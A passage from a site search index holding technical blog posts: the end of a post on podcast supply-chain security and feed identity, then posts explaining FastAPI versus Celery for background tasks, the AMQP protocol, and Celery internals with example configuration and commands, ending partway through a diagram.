<li>Platforms: Track content integrity, alert on changes, read-only states  </li> <li>Apps: Detect diffs, warn on suspicious content, surface provenance info  </li> </ul>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#conclusion","title":"Conclusion","text":"<p>Podcasting today is a global, unauthenticated supply chain - not broken, just security-blind. Podcast Index and Podcasting 2.0 expanded functionality but did not change the trust model.</p> <p>Understanding podcasts as a supply chain - with multiple copies, influence, and monetization - is the first step toward modeling security assumptions.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#final-note","title":"Final Note","text":"<p>Security begins with modeling, not overnight fixes.</p> <p>This analysis is based on publicly available specifications and official documentation.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#references-and-official-documentation","title":"References and Official Documentation","text":"<ul> <li> <p>RSS 2.0 Specification   https://www.rssboard.org/rss-specification  </p> </li> <li> <p>Apple Podcasts \u2013 RSS Feed Requirements   https://podcasters.apple.com/support/823-podcast-requirements   https://help.apple.com/itc/podcasts_connect/#/itcb54353390  </p> </li> <li> <p>Podcast Index \u2013 Official Site &amp; Docs   https://podcastindex.org   https://github.com/Podcastindex-org  </p> </li> <li> <p>Podcast Namespace (Podcasting 2.0)   https://github.com/Podcastindex-org/podcast-namespace   https://github.com/Podcastindex-org/podcast-namespace/blob/main/docs/1.0.md  </p> </li> <li> <p>Podping Protocol   https://github.com/Podcastindex-org/podping   https://podping.org  </p> </li> <li> <p>Spotify for Creators \u2013 RSS &amp; Hosting Docs   https://providersupport.spotify.com/article/podcast-delivery-specification-1-9  </p> </li> <li> <p>Podbean \u2013 Feed Validation &amp; Publishing   https://help.podbean.com/support/solutions/articles/25000004906-validating-my-podcast-feed  </p> </li> <li> <p>RSS.com \u2013 Podcast RSS Guide   https://rss.com/blog/how-to-create-an-rss-feed/  </p> </li> <li> <p>Libsyn   https://five.libsynsupport.com/hc/en-us/articles/4404425175963-Understand-Your-RSS-Feed  </p> </li> <li> <p>Buzzsprout   https://www.buzzsprout.com/blog/create-podcast-rss-feed  </p> </li> <li> <p>Omny Studio   https://help.tritondigital.com/docs/where-is-my-rss-feed  </p> </li> <li> <p>Podcast Namespace Proposal: alternateEnclosure   https://github.com/Podcastindex-org/podcast-namespace/blob/main/proposal-docs/alternateEnclosure/alternateEnclosure.md</p> </li> </ul>"},{"location":"blog/blogs/2025-12-31_feed-identity-vs-content-integrity/","title":"Appendix: Feed Identity vs Content Integrity","text":"<p>This appendix complements my article on Podcast Security.</p> <p>Podcast security can be thought of in two complementary layers:</p>"},{"location":"blog/blogs/2025-12-31_feed-identity-vs-content-integrity/#1-content-integrity","title":"1. Content Integrity","text":"<ul> <li>Guarantees that the audio file delivered to a listener is exactly the same as the one published.</li> <li>Traditionally involves cryptographic hashes, signatures, and immutability.</li> <li>Challenges in podcasting:</li> <li>Dynamic ad insertion (different regions get different audio)</li> <li>CDN variations and caching</li> <li>Personalized content or regional versions</li> <li>Result: A canonical audio artifact often does not exist, making episode-level integrity hard to enforce.</li> </ul>"},{"location":"blog/blogs/2025-12-31_feed-identity-vs-content-integrity/#2-feed-identity-provenance","title":"2. Feed Identity / Provenance","text":"<ul> <li>Ensures that a listener or app discovers the authoritative feed for a given show.</li> <li>Focuses on trusting the source, rather than each audio file:</li> <li>Prevents copied or fake feeds from masquerading as the original show</li> <li>Reduces the risk of monetization or ad tampering on duplicate feeds</li> <li>Feeds act as the primary security anchor, while content may vary dynamically.</li> <li>Key insight: In today\u2019s ecosystem, establishing feed identity may provide more practical security guarantees than attempting per-episode integrity. Feed-level trust enables listeners and apps to rely on the original publisher, even when audio content is personalized or region-specific.</li> <li>Platform-agnostic: This concept applies regardless of hosting or playback platform.</li> </ul>"},{"location":"blog/blogs/2025-12-31_feed-identity-vs-content-integrity/#visual-diagram","title":"Visual Diagram","text":"<pre><code>                 +--------------------------+           +--------------------------+\n                 |      Podcast Feed        |           |      Podcast Feed        |\n                 |      (Original)          |           |      (Original)          |\n                 +-----------+--------------+           +-----------+--------------+\n                             |                                      |\n                -------------------------------          ------------------------------\n                |  Listener / App receives    |          | Listener / App receives    |\n                |  audio with integrity?      |          | audio may vary per region, |\n                |  (same file for everyone)   |          | dynamic ads, CDN, etc.     |\n                -------------------------------          ------------------------------\n                    Content Integrity                          Feed Identity\n</code></pre> <p>Takeaway:</p> <ul> <li>Content Integrity: Audio may differ per listener due to ads, CDN, region, or personalization.</li> <li>Feed Identity: Ensures the listener reaches the correct authoritative feed, even if the audio varies dynamically.</li> </ul>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/","title":"Async Tasks in Python: Why FastAPI Isn\u2019t Enough and When You Need Celery","text":"<p>FastAPI is an excellent web framework. It\u2019s fast, async-first, and expressive.</p> <p>But not every async problem belongs inside your FastAPI app.</p> <p>At some point, background tasks become real async workloads - and no amount of <code>BackgroundTasks</code>, <code>asyncio.create_task</code>, or extra Gunicorn workers will save you.</p> <p>That\u2019s where Celery comes in.</p> <p>This post explains why, when, and how backend engineers should move async work out of FastAPI and into a proper task system.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#the-limits-of-async-in-fastapi","title":"The Limits of \u201cAsync\u201d in FastAPI","text":"<p>FastAPI gives you a few options for background execution:</p> <ul> <li><code>BackgroundTasks</code></li> <li><code>asyncio.create_task</code></li> <li>Extra Gunicorn / Uvicorn workers</li> <li>Async libraries (including tools from FastAPI\u2019s ecosystem)</li> </ul> <p>These are useful - until they aren\u2019t.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#what-these-approaches-cant-solve","title":"What These Approaches Can\u2019t Solve","text":"<p>They all share the same fundamental limitations:</p> <ul> <li>Tasks die if the process crashes</li> <li>No retries</li> <li>No visibility into task state</li> <li>No rate control</li> <li>No scheduling</li> <li>No horizontal scaling across machines</li> <li>No durable queue</li> </ul> <p>In other words:</p> <p>They are background tasks, not a background system.</p> <p>If your task must: - survive restarts - retry on failure - run minutes later - scale independently - or run on another machine</p> <p>FastAPI is no longer the right tool.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#the-missing-piece-message-queues","title":"The Missing Piece: Message Queues","text":"<p>Before Celery, you need one core idea:</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#what-is-a-message-queue","title":"What Is a Message Queue?","text":"<p>A message queue decouples who asks for work from who does the work.</p> <p>Instead of: <pre><code>HTTP request \u2192 FastAPI \u2192 heavy work\n</code></pre></p> <p>You get: <pre><code>HTTP request \u2192 queue \u2192 worker \u2192 result\n</code></pre></p> <p>Key benefits: - Requests return immediately - Work is durable - Workers scale independently - Failures are isolated</p> <p>The queue acts as a buffer and contract between your web app and your background processing system.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#enter-celery","title":"Enter Celery","text":"<p>Celery is a distributed task queue for Python.</p> <p>It is not \u201cjust async\u201d. It is infrastructure.</p> <p>Celery gives you:</p> <ul> <li>Reliable background execution</li> <li>Distributed workers</li> <li>Task retries and backoff</li> <li>Scheduling</li> <li>Result tracking</li> <li>Horizontal scalability</li> </ul> <p>FastAPI handles HTTP. Celery handles work.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#core-celery-concepts-backend-engineer-view","title":"Core Celery Concepts (Backend Engineer View)","text":""},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#task","title":"Task","text":"<p>A task is a Python function wrapped with execution metadata.</p> <pre><code>@app.task\ndef send_email(user_id: int):\n    ...\n</code></pre> <p>Tasks are:</p> <ul> <li>serializable</li> <li>retryable</li> <li>idempotent by design (or should be)</li> </ul>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#broker-queue","title":"Broker (Queue)","text":"<p>The broker is where tasks live before execution.</p> <p>Common brokers:</p> <ul> <li>Redis</li> <li>RabbitMQ</li> </ul> <p>The broker:</p> <ul> <li>stores messages</li> <li>guarantees delivery</li> <li>decouples producers from consumers</li> </ul> <p>FastAPI produces tasks. Celery consumes them.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#celery-worker","title":"Celery Worker","text":"<p>Workers:</p> <ul> <li>pull tasks from the broker</li> <li>execute them</li> <li>report results</li> </ul> <p>They:</p> <ul> <li>run outside FastAPI</li> <li>can live on different machines</li> <li>scale independently</li> </ul> <p>This separation is the architectural win.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#result-backend","title":"Result Backend","text":"<p>Optional, but powerful.</p> <p>Stores:</p> <ul> <li>task status</li> <li>return values</li> <li>exceptions</li> </ul> <p>Useful for:</p> <ul> <li>monitoring</li> <li>polling</li> <li>debugging</li> <li>workflows</li> </ul>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#celery-beat-scheduler","title":"Celery Beat (Scheduler)","text":"<p>For periodic tasks:</p> <ul> <li>cron-like jobs</li> <li>cleanup</li> <li>reports</li> <li>batch processing</li> </ul> <p>This replaces fragile cron scripts with distributed scheduling.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#a-real-backend-example","title":"A Real Backend Example","text":""},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#the-wrong-way","title":"The Wrong Way","text":"<pre><code>@app.post(\"/process\")\nasync def process(data: Data):\n    await heavy_processing(data)\n    return {\"ok\": True}\n</code></pre> <p>Problems:</p> <ul> <li>request blocks</li> <li>timeouts</li> <li>crashes kill work</li> <li>no retries</li> </ul>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#the-right-way-fastapi-celery","title":"The Right Way (FastAPI + Celery)","text":"<pre><code>@app.post(\"/process\")\ndef process(data: Data):\n    task = process_data.delay(data.dict())\n    return {\"task_id\": task.id}\n</code></pre> <p>Now:</p> <ul> <li>request returns instantly</li> <li>work survives restarts</li> <li>failures retry</li> <li>workers scale separately</li> </ul> <p>This is production architecture.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#when-you-actually-need-celery","title":"When You Actually Need Celery","text":"<p>Use Celery if your task is:</p> <ul> <li>CPU-heavy</li> <li>Long-running</li> <li>Retry-sensitive</li> <li>Scheduled</li> <li>Business-critical</li> <li>Cross-service</li> <li>Non-interactive</li> </ul> <p>Don\u2019t use Celery for:</p> <ul> <li>tiny side effects</li> <li>request-scoped logic</li> <li>simple logging</li> </ul> <p>Celery is powerful - and should be used deliberately.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#fastapi-and-celery-clear-responsibility-split","title":"FastAPI and Celery: Clear Responsibility Split","text":"<pre><code>| Concern                  | Tool    |\n|                          | -       |\n| HTTP, validation, auth   | FastAPI |\n| Async I/O inside request | FastAPI |\n| Durable background work  | Celery  |\n| Retries, scheduling      | Celery  |\n| Distributed execution    | Celery  |\n</code></pre> <p>Clean boundaries lead to reliable systems.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#closing-thought","title":"Closing Thought","text":"<p>Async is not just about <code>await</code>.</p> <p>It\u2019s about failure, time, and distribution.</p> <p>FastAPI is excellent at serving requests. Celery is excellent at doing work.</p> <p>Knowing when to separate the two is a sign of a mature backend engineer.</p>"},{"location":"blog/blogs/2026-01-06_async-tasks-fastapi-celery/#references-official-docs","title":"References (Official Docs)","text":"<ul> <li> <p>FastAPI Background Tasks   https://fastapi.tiangolo.com/tutorial/background-tasks/</p> </li> <li> <p>Celery Documentation   https://docs.celeryq.dev/</p> </li> <li> <p>Celery First Steps   https://docs.celeryq.dev/en/stable/getting-started/first-steps-with-celery.html</p> </li> <li> <p>Message Brokers (Celery Concepts)   https://docs.celeryq.dev/en/stable/getting-started/introduction.html</p> </li> </ul>"},{"location":"blog/blogs/2026-01-07_amqp-explained/","title":"AMQP Explained for Backend Engineers","text":"<p>At some point, every backend system outgrows direct request\u2013response flows.</p> <p>You add background jobs. You decouple services. You need reliability when processes crash.</p> <p>This is where message-oriented architectures appear-and AMQP is one of the most important protocols behind them.</p> <p>This post explains what AMQP actually is, how it works, and why backend engineers should understand it-even if they never implement a broker themselves.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#what-is-amqp","title":"What Is AMQP?","text":"<p>AMQP (Advanced Message Queuing Protocol) is an open, binary, application-layer protocol designed for reliable, asynchronous message passing between distributed systems.</p> <p>AMQP is not: - A message broker - A queue implementation - A library</p> <p>It is a protocol-a contract that defines how producers, brokers, and consumers communicate.</p> <p>RabbitMQ is the most common AMQP implementation, but the protocol itself is independent of any vendor.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#why-amqp-exists","title":"Why AMQP Exists","text":"<p>HTTP is great for synchronous communication.</p> <p>It\u2019s terrible when: - The consumer is down - Work takes minutes or hours - You need retries, ordering, or durability - You want to decouple producers from consumers</p> <p>AMQP was designed to solve these problems by: - Decoupling senders and receivers - Persisting messages - Supporting routing and fan-out - Enabling fault tolerance by design</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#core-amqp-concepts-the-mental-model","title":"Core AMQP Concepts (The Mental Model)","text":"<p>If you only remember one thing, remember this:</p> <p>Producers never talk directly to queues.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#producer","title":"Producer","text":"<p>A service that publishes messages to an exchange.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#exchange","title":"Exchange","text":"<p>A routing layer that decides where messages go. It receives messages and routes them to queues based on rules.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#queue","title":"Queue","text":"<p>A buffer that stores messages until a consumer processes them.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#consumer","title":"Consumer","text":"<p>A process that pulls messages from a queue and handles them.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#broker","title":"Broker","text":"<p>The server that hosts exchanges, queues, and routing logic.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#exchange-types-routing-rules","title":"Exchange Types (Routing Rules)","text":"<p>AMQP routing happens inside exchanges.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#direct-exchange","title":"Direct Exchange","text":"<ul> <li>Routes messages by exact routing key match</li> <li>Common for task queues</li> </ul>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#fanout-exchange","title":"Fanout Exchange","text":"<ul> <li>Broadcasts messages to all bound queues</li> <li>Used for pub/sub events</li> </ul>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#topic-exchange","title":"Topic Exchange","text":"<ul> <li>Pattern-based routing (<code>order.*</code>, <code>*.created</code>)</li> <li>Very common in event-driven systems</li> </ul>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#headers-exchange","title":"Headers Exchange","text":"<ul> <li>Routes based on message headers</li> <li>Rare, but flexible</li> </ul> <p>Routing logic is explicit and predictable-this is one of AMQP\u2019s strengths.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#message-lifecycle","title":"Message Lifecycle","text":"<p>A typical flow looks like this:</p> <ol> <li>Producer publishes a message to an exchange</li> <li>Exchange routes the message to one or more queues</li> <li>Broker persists the message (if durable)</li> <li>Consumer receives the message</li> <li>Consumer acknowledges processing</li> <li>Broker removes the message</li> </ol> <p>If the consumer crashes before acknowledgment, the message returns to the queue.</p> <p>This is reliability by protocol, not by convention.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#delivery-guarantees","title":"Delivery Guarantees","text":"<p>AMQP supports multiple delivery semantics:</p> <ul> <li>At-most-once \u2013 fast, but messages can be lost</li> <li>At-least-once \u2013 reliable, but requires idempotency</li> <li>Exactly-once \u2013 not truly achievable in distributed systems</li> </ul> <p>Most production systems use at-least-once delivery and handle duplicates at the application level.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#durability-and-persistence","title":"Durability and Persistence","text":"<p>AMQP allows you to configure: - Durable exchanges - Durable queues - Persistent messages</p> <p>Together, these ensure messages survive: - Broker restarts - Worker crashes - Temporary outages</p> <p>Without durability, AMQP behaves more like an in-memory event bus.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#amqp-vs-http","title":"AMQP vs HTTP","text":"Aspect HTTP AMQP Communication Synchronous Asynchronous Coupling Tight Loose Reliability Client-managed Broker-managed Retries Manual Built-in Backpressure Poor Native Scalability Vertical Horizontal <p>They solve different problems-and often coexist.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#amqp-in-real-systems","title":"AMQP in Real Systems","text":"<p>You rarely \u201cuse AMQP directly\u201d.</p> <p>You use it through: - Celery (task queues) - RabbitMQ (message broker) - MassTransit / Kombu (client libraries)</p> <p>FastAPI handles HTTP. AMQP handles everything that shouldn\u2019t block HTTP.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#when-amqp-is-the-right-choice","title":"When AMQP Is the Right Choice","text":"<p>AMQP shines when: - Tasks take longer than a request lifecycle - Reliability matters more than latency - You need retries, delays, or scheduling - Systems must survive partial failure - Services should not know about each other</p> <p>If you\u2019re building serious backend infrastructure, AMQP is not optional knowledge.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#closing-thought","title":"Closing Thought","text":"<p>AMQP isn\u2019t exciting, and you probably won\u2019t think about it most days. But when systems fail under load, during deploys, or at 3 a.m., it\u2019s often the difference between lost work and a system that recovers quietly. Knowing how it works makes you a better backend engineer, even if you never touch the broker directly.</p>"},{"location":"blog/blogs/2026-01-07_amqp-explained/#official-references","title":"Official References","text":"<ul> <li>AMQP 0-9-1 Specification   https://www.rabbitmq.com/resources/specs/amqp0-9-1.pdf</li> <li>RabbitMQ AMQP Concepts   https://www.rabbitmq.com/tutorials/amqp-concepts.html</li> </ul>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/","title":"The Ultimate Celery Internals Guide","text":"<p>Celery is more than async tasks - it\u2019s a distributed execution engine with brokers, workers, and context propagation baked in. Understanding it deeply lets you design robust backend systems without bottlenecks or surprises.</p> <p>This guide covers:</p> <ul> <li>Task serialization and deserialization</li> <li>Brokers, queues, and routing</li> <li>Workers and concurrency models</li> <li>Task context and strategies</li> <li>Retry policies, rate limits, and timeouts</li> <li>Celery Beat for periodic tasks</li> <li>Result backends</li> <li>Real-world FastAPI integration</li> <li>ASCII diagrams</li> <li>Official documentation references</li> </ul>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#1-architecture-overview","title":"1. Architecture Overview","text":"<p>Celery\u2019s flow:</p> <pre><code>Producer (app) \u2192 Broker (RabbitMQ/Redis) \u2192 Worker(s) \u2192 Result Backend\n</code></pre> <ul> <li>Producer: Calls <code>task.delay()</code> or <code>task.apply_async()</code></li> <li>Broker: Stores messages (tasks) temporarily</li> <li>Worker: Picks tasks, deserializes, executes, and optionally stores results</li> <li>Result Backend: Optional storage of return value, status, exceptions</li> </ul>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#2-serialization-deserialization","title":"2. Serialization &amp; Deserialization","text":"<p>Celery tasks are serialized into messages before sending to brokers.</p> <p>Supported formats:</p> <ul> <li><code>json</code> (default for simplicity)</li> <li><code>pickle</code> (supports arbitrary Python objects, security risk), docs</li> <li><code>msgpack</code> (efficient binary format), docs</li> <li><code>yaml</code> (rarely used)</li> </ul> <p>Example:</p> <pre><code>from celery import Celery\n\napp = Celery('tasks', broker='redis://localhost', backend='redis://localhost')\n\n@app.task(serializer='json')\ndef add(x, y):\n    return x + y\n</code></pre> <p>Key points:</p> <ul> <li>Serialization converts Python objects \u2192 bytes</li> <li>Deserialization converts bytes \u2192 Python objects in workers</li> <li>Context (task_id, retries, ETA) is passed with the serialized message</li> </ul> <p>Docs: https://docs.celeryq.dev/en/stable/userguide/configuration.html#task-serializer , https://docs.celeryq.dev/en/stable/internals/reference/celery.utils.serialization.html</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#3-task-options-strategies","title":"3. Task Options &amp; Strategies","text":"<p>Celery tasks support multiple execution strategies:</p> <ul> <li><code>delay()</code>: Shortcut for default async</li> <li><code>apply_async()</code>: Full control (ETA, countdown, retries)</li> <li><code>apply()</code>: Synchronous execution (local call)</li> </ul> <p>Task options:</p> <pre><code>@app.task(bind=True, max_retries=3, time_limit=30, rate_limit='10/m')\ndef fetch(self, url):\n    ...\n</code></pre> <ul> <li><code>bind=True</code> gives access to <code>self</code> (task context)</li> <li><code>max_retries</code> sets retry attempts</li> <li><code>time_limit</code> prevents runaway tasks</li> <li><code>rate_limit</code> throttles execution</li> </ul> <p>Docs: https://docs.celeryq.dev/en/stable/userguide/tasks.html</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#4-broker-queue-internals","title":"4. Broker &amp; Queue Internals","text":"<p>Celery supports multiple brokers:</p> <ul> <li>RabbitMQ (AMQP): full-featured, exchanges, fanout, routing keys</li> <li>Redis: simple FIFO queue</li> <li>SQS, Kafka: other backends</li> </ul> <p>Queue routing example:</p> <pre><code>app.conf.task_routes = {\n    'tasks.add': {'queue': 'math'},\n    'tasks.send_email': {'queue': 'emails'}\n}\n</code></pre> <p>Docs: https://docs.celeryq.dev/en/stable/getting-started/backends-and-brokers/index.html</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#5-workers-concurrency","title":"5. Workers &amp; Concurrency","text":"<p>Workers pull tasks from queues and execute them.</p> <p>Concurrency options:</p> <ul> <li><code>prefork</code> (multiprocessing, default)</li> <li><code>threads</code></li> <li><code>solo</code> (single-threaded)</li> <li><code>gevent</code> (greenlets)</li> </ul> <p>Example:</p> <pre><code>celery -A tasks worker --loglevel=info --concurrency=4\n</code></pre> <p>Workers handle:</p> <ul> <li>Task execution</li> <li>Retry scheduling</li> <li>Task acknowledgment</li> <li>Heartbeats to broker</li> </ul> <p>Docs: https://docs.celeryq.dev/en/main/reference/celery.worker.html#module-celery.worker</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#6-context-propagation","title":"6. Context Propagation","text":"<p>Celery propagates metadata:</p> <ul> <li><code>task_id</code></li> <li><code>args</code> / <code>kwargs</code></li> <li><code>retries</code></li> <li><code>ETA</code> / countdown</li> <li>Custom headers via <code>task.request</code></li> </ul> <pre><code>@app.task(bind=True)\ndef show_context(self):\n    print(f\"Task ID: {self.request.id}\")\n</code></pre> <p>Docs: https://docs.celeryq.dev/en/main/reference/celery.app.task.html#celery.app.task.Task.request</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#7-retries-error-handling-timeouts","title":"7. Retries, Error Handling, &amp; Timeouts","text":"<p>Retry:</p> <pre><code>@app.task(bind=True, max_retries=5)\ndef fetch_url(self, url):\n    try:\n        ...\n    except Exception as exc:\n        raise self.retry(exc=exc, countdown=5)\n</code></pre> <p>Docs: https://docs.celeryq.dev/en/main/userguide/tasks.html#std-state-RETRY</p> <p>Time limits:</p> <pre><code>@app.task(time_limit=10, soft_time_limit=8)\ndef long_task():\n    ...\n</code></pre> <p>Docs https://docs.celeryq.dev/en/main/userguide/tasks.html#Task.time_limit</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#8-periodic-tasks-celery-beat","title":"8. Periodic Tasks: Celery Beat","text":"<p>Beat schedules tasks:</p> <pre><code>from celery.schedules import crontab\n\napp.conf.beat_schedule = {\n    \"cleanup-daily\": {\n        \"task\": \"tasks.cleanup\",\n        \"schedule\": crontab(hour=3, minute=0),\n    }\n}\n</code></pre> <p>Run: <code>celery -A tasks beat --loglevel=info</code></p> <p>Docs: https://docs.celeryq.dev/en/main/reference/celery.schedules.html#celery.schedules.crontab , https://docs.celeryq.dev/en/main/userguide/periodic-tasks.html</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#9-result-backends","title":"9. Result Backends","text":"<p>Stores:</p> <ul> <li><code>SUCCESS</code> / <code>FAILURE</code></li> <li>Return values</li> <li>Tracebacks</li> <li>Async retrieval</li> </ul> <pre><code>res = add.delay(2, 3)\nprint(res.get(timeout=10))\n</code></pre> <p>Docs: </p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#10-real-world-example-with-fastapi","title":"10. Real-World Example with FastAPI","text":"<pre><code>from fastapi import FastAPI\nfrom tasks import add\n\napp = FastAPI()\n\n@app.post(\"/add\")\ndef enqueue_add(a: int, b: int):\n    task = add.delay(a, b)\n    return {\"task_id\": task.id}\n</code></pre> <p>Run worker:</p> <pre><code>celery -A tasks worker --loglevel=info\n</code></pre>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#11-monitoring","title":"11. Monitoring","text":"<ul> <li>Flower UI: web dashboard</li> </ul> <pre><code>pip install flower\ncelery -A tasks flower\n</code></pre> <ul> <li>CLI introspection:</li> </ul> <pre><code>celery -A tasks inspect active\ncelery -A tasks inspect scheduled\n</code></pre> <p>Docs: https://docs.celeryq.dev/en/main/userguide/monitoring.html#flower-real-time-celery-web-monitor</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#12-scaling-distributed-design-patterns","title":"12. Scaling &amp; Distributed Design Patterns","text":"<ul> <li>Multiple queues \u2192 dedicated workers</li> <li>Autoscaling worker pools</li> <li>Prefetch limit tuning</li> <li>Retry policies per queue</li> <li>Task chaining &amp; groups (<code>chain</code>, <code>group</code>, <code>chord</code>)</li> </ul> <p>Docs: https://docs.celeryq.dev/en/stable/userguide/canvas.html</p>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#other-references","title":"Other References","text":"<ul> <li>Official Celery Docs: https://docs.celeryq.dev/en/stable/</li> <li>RabbitMQ Docs: https://www.rabbitmq.com/documentation.html</li> <li>Redis Docs: https://redis.io/documentation</li> </ul>"},{"location":"blog/blogs/2026-01-10_the-ultimate-celery-internals-guide/#diagram","title":"Diagram","text":"<p>I couldn\u2019t find a diagram that accurately captured how all the moving parts fit together, so I built one based on the actual Celery execution flow and common production setups.</p> <p>The diagram below is intentionally opinionated\u2014it reflects how Celery is typically used in real systems, not just how it\u2019s described in isolation.</p> <pre><code>                    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                    \u2502        Client / FastAPI      \u2502\n                    \u2502  - calls task.delay()        \u2502\n                    \u2502  - sends headers + args      \u2502\n                    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                    \u2502\n                                    \u2502 1. Task call\n                                    \u25bc\n                    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                    \u2502      Celery Client Library   \u2502\n                    \u2502 - Builds task message        \u2502\n                    \u2502 - Applies routing rules      \u2502\n                    \u2502 - Sets ETA, retries, priority\u2502\n                    \u2502 - Adds context (task id, app)\u2502\n                    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                    \u2502\n                                    \u2502 2. Serialize\n                                    \u25bc\n                    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                    \u2502        Serializer            \u2502\n                    \u2502  JSON | msgpack | pickle     \u2502\n                    \u2502  (args, kwargs, headers)     \u2502\n                    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                    \u2502\n                                    \u2502 3. AMQP message\n                                    \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                               Broker (AMQP)                            \u2502\n\u2502                             RabbitMQ / Redis                           \u2502\n\u2502                                                                        \u2502\n\u2502                   Exchange  \u2500\u2500\u25ba  Routing Key  \u2500\u2500\u25ba  Queue               \u2502\n\u2502                                                                        \u2502\n\u2502  - Stores messages                                                     \u2502\n\u2502  - Handles fanout / topics / direct                                    \u2502\n\u2502  - Manages priority, TTL, redelivery                                   \u2502\n\u2502  - No task execution happens here                                      